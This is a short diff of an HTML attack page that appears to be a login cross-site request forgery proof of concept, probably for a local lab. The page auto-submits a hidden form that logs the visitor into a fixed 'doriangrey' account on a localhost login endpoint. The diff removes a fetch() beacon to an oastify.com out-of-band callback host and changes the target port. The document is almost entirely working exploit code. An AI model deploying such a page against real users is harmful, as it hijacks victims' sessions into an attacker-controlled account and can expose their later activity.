@@ -2,15 +2,12 @@
 <html>
 <body>
 <div class="message">loading...</div>
-<form id="f" method="POST" action="http://localhost/login?next=/chat/1">
+<form id="f" method="POST" action="http://localhost:8080/login?next=/chat/1">
   <input name="username" value="doriangrey">
   <input name="password" value="doriangrey">
 </form>
 <script>
-  fetch('https://lpep3rg0quhsgc82dvp09hpx8oef26qv.oastify.com/step1')
-  .finally(() => {
-    document.getElementById('f').submit();
-  });
+  document.getElementById('f').submit();
 </script>
 </body>
 </html>
